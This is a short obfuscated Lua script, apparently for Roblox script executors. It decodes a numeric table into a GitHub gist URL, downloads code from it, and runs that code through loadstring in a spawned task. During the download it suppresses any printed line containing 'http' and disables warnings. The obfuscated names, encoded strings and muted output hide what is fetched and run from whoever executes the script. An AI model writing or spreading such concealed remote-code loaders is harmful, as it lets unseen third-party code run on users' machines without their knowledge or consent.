local _0xLL1 = string; local _0xLL2 = table; local _0xLL3 = game;
local _0xLL4 = {116,128,128,124,127,70,59,59,115,117,127,128,58,115,117,128,116,129,110,129,127,113,126,111,123,122,128,113,122,128,58,111,123,121,59,67,95,109,130,117,128,109,126,59,63,65,109,66,113,112,109,113,114,68,114,62,114,66,69,67,62,114,62,114,62,63,68,68,65,111,110,111,63,61,62,113,59,126,109,131,59,110,61,69,110,109,110,112,113,60,60,109,69,63,60,62,63,64,112,65,61,112,111,111,62,113,114,112,111,63,62,61,114,67,113,112,112,113,61,69,65,59,82,96,77,92,57,95,77,98,85,96,77,94,57,84,97,78,57,78,81,96,77}
local _0xLL5 = function(d, k) 
    local r = "" 
    local s = 24 / 2 
    for i = 1, #d do 
        r = r .. _0xLL1.char(d[i] - s) 
    end 
    return r 
end

local _0xLL6 = {
    ["\103\101\116"] = function(u) return _0xLL3:HttpGet(u, true) end,
    ["\108\111\97\100"] = function(c) return loadstring(c) end
}

local function _0xLL7()
    local _0xZ1 = print; local _0xZ2 = warn; local _0xZ3 = getfenv;
    print = function(...) if not tostring(...):match("http") then _0xZ1(...) end end;
    warn = function() end;
    
    local _0xX = 0;
    while _0xX < 5 do
        if _0xX == 0 then
            _0xX = 2
        elseif _0xX == 2 then
            local _0xURL = _0xLL5(_0xLL4)
            local _0xCACHE = "?v=" .. _0xLL1.sub(tostring(math.random() * 100), 1, 5)
            local _0xS, _0xC = pcall(_0xLL6["\103\101\116"], _0xURL .. _0xCACHE)
            
            if _0xS and _0xC then
                local _0xF = _0xLL6["\103\101\116"] == nil and nil or _0xLL6["\108\111\97\100"](_0xC)
                if _0xF then 
                    task.spawn(_0xF)
                end
            end
            _0xX = 6
        end
    end
    print = _0xZ1; warn = _0xZ2;
end

_0xLL7()
